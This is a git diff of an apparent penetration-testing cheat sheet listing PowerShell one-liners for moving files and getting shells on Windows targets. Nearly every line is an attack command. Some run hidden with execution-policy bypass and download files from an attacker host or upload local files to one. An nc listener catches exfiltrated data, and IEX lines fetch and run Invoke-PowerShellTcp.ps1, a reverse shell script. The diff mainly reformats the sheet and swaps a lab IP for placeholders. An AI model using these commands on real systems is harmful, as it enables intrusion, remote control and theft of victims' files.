@@ -14,19 +14,19 @@ IEX((New-Object System.Net.WebClient).DownloadString('http://<LocalIPAddress>:<P
 =========================================
 # Download File:
 ```ps
-powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).DownloadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LOCAL_FILENAME')
+powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).DownloadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LocalFile')
 
 # In PowerShell:
-(New-Object System.Net.WebClient).DownloadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LOCAL_FILENAME')
+(New-Object System.Net.WebClient).DownloadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LocalFile')
 ```
 
 =========================================
 # Upload File:
 ```ps
-powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).UploadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LOCAL_FILENAME')
+powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).UploadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LocalFile')
 
 # In PowerShell:
-(New-Object System.Net.WebClient).UploadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LOCAL_FILENAME')
+(New-Object System.Net.WebClient).UploadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LocalFile')
 ```
 
 ---------------
@@ -34,12 +34,15 @@ powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClien
 ## On Local Box
 nc -lnvp 443 > Out.File
 ## On Windows Box
+```ps
 Invoke-RestMethod -Uri http://<LocalIPAddress>:<PORT>/<FILE> -Method Post -InFile <LocalFile>
-
+```
 =========================================
 
+[+] EXTRA
 ## Upgrade PSH to 64-bit shell
+```ps
 %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
-C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.Webclient).DownloadString('http://192.168.119.187:80/Invoke-PowerShellTcp.ps1')
-
-C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -Exec Bypass -NoP -NonI -W Hidden IEX(New-Object Net.Webclient).DownloadString('http://192.168.119.187:80/Invoke-PowerShellTcp.ps1')
+C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.Webclient).DownloadString('http://<LocalIPAddress>:<PORT>/Invoke-PowerShellTcp.ps1')
+C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -Exec Bypass -NoP -NonI -W Hidden IEX(New-Object Net.Webclient).DownloadString('http://<LocalIPAddress>:<PORT>/Invoke-PowerShellTcp.ps1')
+```
